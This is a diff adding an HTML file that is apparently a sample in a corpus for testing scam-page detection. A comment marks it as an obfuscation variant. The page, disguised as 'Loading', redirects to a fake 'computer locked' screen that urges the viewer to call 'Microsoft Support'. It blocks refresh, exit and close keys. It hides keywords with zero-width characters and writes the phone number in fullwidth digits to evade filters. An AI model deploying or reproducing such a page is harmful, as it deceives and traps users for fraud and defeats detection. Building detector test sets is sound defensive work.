@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<!-- Variant: content obfuscation — zero-width characters inside keywords, fullwidth digits and non-breaking hyphens in the phone number. -->
+<html lang="en"><head><meta charset="utf-8"><title>Loading</title></head>
+<body>
+<script>
+  const html = `<!DOCTYPE html><html><head><meta charset="utf-8"><title>Alert</title>
+  <style>body{margin:0;background:#1a3dff;color:#fff;font-family:Arial;height:100vh;display:flex;align-items:center;justify-content:center;text-align:center}</style></head>
+  <body><div><h1>Your c​omputer has been l​ocked</h1>
+  <p>Call Mi​crosoft Supp​ort now:</p>
+  <h2>１‑８００‑５５５‑０１９９</h2></div>
+  <script>
+    document.addEventListener('keydown', e => { if (['F5','F11','F12','Escape'].includes(e.key) || (e.ctrlKey && 'rwl'.includes(e.key.toLowerCase()))) e.preventDefault(); });
+  <\/script></body></html>`;
+  location.href = URL.createObjectURL(new Blob([html], { type: 'text/html' }));
+</script></body></html>
